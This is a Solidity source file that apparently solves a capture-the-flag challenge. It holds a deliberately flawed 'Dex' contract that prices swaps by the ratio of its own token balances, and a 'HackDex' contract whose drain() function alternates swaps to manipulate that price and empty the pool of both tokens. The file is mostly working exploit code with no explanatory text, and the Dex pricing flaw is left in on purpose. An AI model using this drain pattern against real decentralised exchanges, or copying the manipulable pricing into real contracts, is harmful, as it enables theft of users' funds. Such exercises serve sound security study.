// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import 'hardhat/console.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _mint(dexInstance, initialSupply * 10);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract HackDex {
    Dex public dex;
    address public tokenA;
    address public tokenB;

    function setDex(address dex_) public {
        dex = Dex(dex_);
    }

    function setTokens(address tokenA_, address tokenB_) public {
        tokenA = tokenA_;
        tokenB = tokenB_;
    }

    function drain() public {
        bool isAtoB = true;
        while(dex.balanceOf(tokenA, address(dex)) != 0 && dex.balanceOf(tokenB, address(dex)) != 0) {
            if(isAtoB) {
                if(dex.balanceOf(tokenA, address(this)) < dex.balanceOf(tokenA, address(dex))) {
                    dex.swap(tokenA, tokenB, dex.balanceOf(tokenA, address(this)));
                    isAtoB = !isAtoB;
                } else {
                    dex.swap(tokenA, tokenB, dex.balanceOf(tokenA, address(dex)));
                    return;
                }
            } else {
                if(dex.balanceOf(tokenB, address(this)) < dex.balanceOf(tokenB, address(dex))) {
                    dex.swap(tokenB, tokenA, dex.balanceOf(tokenB, address(this)));
                    isAtoB = !isAtoB;
                } else {
                    dex.swap(tokenB, tokenA, dex.balanceOf(tokenB, address(dex)));
                    return;
                }
            }
        }
    }

    // approve all for dex
    function approveDex() public {
        dex.approve(address(dex), 2**256 - 1);
    }
}